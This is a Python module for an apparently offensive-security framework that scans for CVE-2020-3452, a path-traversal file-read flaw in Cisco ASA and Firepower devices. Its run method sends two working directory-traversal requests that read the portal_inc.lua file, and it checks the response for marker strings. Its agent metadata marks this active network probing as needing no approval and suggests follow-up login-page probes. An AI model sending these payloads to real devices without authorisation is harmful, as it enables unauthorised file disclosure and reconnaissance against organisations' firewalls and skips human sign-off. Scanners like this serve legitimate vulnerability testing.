#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software is vulnerab."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco Adaptive Security Appliance (ASA)/Firepower Threat Defense (FTD) - Local File Inclusion Detection',
        'description': 'Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software is vulnerable to local file inclusion due to directory traversal attacks that can read sensitive files on a targeted system because of a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'lfi', 'kev', 'packetstorm', 'cisco', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://twitter.com/aboul3la/status/1286012324722155525',
            'http://packetstormsecurity.com/files/158646/Cisco-ASA-FTD-Remote-File-Disclosure.html',
            'http://packetstormsecurity.com/files/158647/Cisco-Adaptive-Security-Appliance-Software-9.11-Local-File-Inclusion.html',
            'http://packetstormsecurity.com/files/159523/Cisco-ASA-FTD-9.6.4.42-Path-Traversal.html',
            'http://packetstormsecurity.com/files/160497/Cisco-ASA-9.14.1.10-FTD-6.6.0.1-Path-Traversal.html',
        ],
        'cve': 'CVE-2020-3452',
    }

    def run(self):
        for path in ('/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../', '/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('INTERNAL_PASSWORD_ENABLED', 'CONF_VIRTUAL_KEYBOARD',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Cisco Adaptive Security Appliance (ASA)/Firepower Threat Defense (FTD) - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

